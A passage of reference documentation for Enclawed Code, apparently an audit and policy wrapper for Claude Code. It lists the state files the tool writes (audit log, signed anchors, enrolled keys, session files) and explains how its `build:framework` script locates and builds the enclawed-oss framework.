`<state>` is `$ENCLAWED_STATE_DIR`, default `~/.enclawed` (`%USERPROFILE%\.enclawed` on Windows).

| Path | Written by | Contents |
|---|---|---|
| `<state>/claude-code/audit.jsonl` | hook, launcher, Enclawed Code's commands | the hash-chained audit log |
| `<state>/claude-code/audit.jsonl.enclaweder-anchor.json` | launcher | offline copy of the device-signed head anchor |
| `<state>/claude-code/enclawed.json` | `policy init` and friends | Enclawed Code's own policy (0600) |
| `<state>/claude-code/config.json` | `policy use` | the `policy use` pointer |
| `<state>/claude-code/auth/` | `auth enroll`, verifications | enrolled security keys and passkeys (public keys, credential ids, counters, attestation summary), failure count, the key-signed unlock ticket (0600 files, 0700 directory) |
| `<state>/claude-code/audit.jsonl.head` | same | the head anchor (newest record hash) |
| `<state>/claude-code/audit.jsonl.lock` | same, transient | append lock |
| `<state>/claude-code/claude-version.json` | launcher, doctor | cached `claude --version` |
| `$ENCLAWED_HISTORY_DIR` or `<state>/history/` (`objects/`, `index.jsonl`) | hook, `history restore`, `history prune` | file history, shared with the Enclawed gateway |
| `<runtime dir>/ecwcode-<uid>/s-XXXXXX/` (`session.json`, `settings.json`, `decided/`) and `h-XXXXXX/hw.sock` | launcher | per-session files and the hardware relay, 0700/0600, never inside the project (removed on exit, except for background sessions). `<runtime dir>` is the first of `$XDG_RUNTIME_DIR`, `$TMPDIR`, `/tmp`, `<state>/claude-code` outside the project |
| managed policy (see [policy](#where-it-is-read-from)) | an administrator | read only |
| managed settings: `/etc/claude-code/`, `/Library/Application Support/ClaudeCode/`, `C:\Program Files\ClaudeCode\` (`managed-settings.json`, `managed-settings.d/*.json`) | an administrator | read only (checked structurally) |
| `~/.enclawed/enclawed.json` (or the other config locations) | you | read only |
| Claude Code transcripts named in `session.start` records | Claude Code | read only, by `audit reconcile` |
| `<install>/.enclawed-dev/` | `npm run build:framework` | the framework build Enclawed Code loads (from the `vendor/enclawed-oss` submodule); there is no npm dependency on `enclawed`, and without this build every command says how to build it |

---

## `npm run build:framework`

```
npm run build:framework [-- <path-to-enclawed-oss>]
node scripts/build-dev-framework.mjs [<path-to-enclawed-oss>]
```

The device-evidence features (attestation, the device head anchor) need framework exports added to enclawed-oss in November 2026 (`hardwareRootSigningDevice`, `enclawederHeadAnchor`, `verifyAnchor`, `verifyCert`, `verifyChallenge`); with an older build they report `unavailable` and everything else works.

Builds the `enclawed/framework` entry point of an enclawed-oss checkout into `.enclawed-dev/framework/framework.js` inside this installation, without touching the checkout's own `dist/`. Enclawed Code loads only that build: it has no npm dependency on `enclawed`. Without the build, or when it lacks an export Enclawed Code needs, every command stops with a message that says how to build or update it, the launcher does not start claude, and the hooks deny every call.

The checkout is, in order of precedence:

1. the path given as the first argument;
2. `ENCLAWED_OSS_DIR` (an empty value counts as unset);
3. the `vendor/enclawed-oss` git submodule, when it contains `src/framework.ts` (the default after `git clone --recurse-submodules`);
4. a sibling checkout, `../enclawed-oss`.

The checkout must have its dependencies installed (`pnpm install`): the script needs its `src/framework.ts` and `node_modules/tsdown`, otherwise it prints `build-dev-framework: <dir> is not an installed enclawed-oss checkout` and exits 1. It removes and rebuilds `.enclawed-dev/framework/`, points `.enclawed-dev/node_modules` (a symlink) at the checkout's `node_modules`, writes `.enclawed-dev/tsdown.config.mjs`, and runs tsdown from the checkout. On success it prints `build-dev-framework: built <path>`; a failed build exits with tsdown's status.
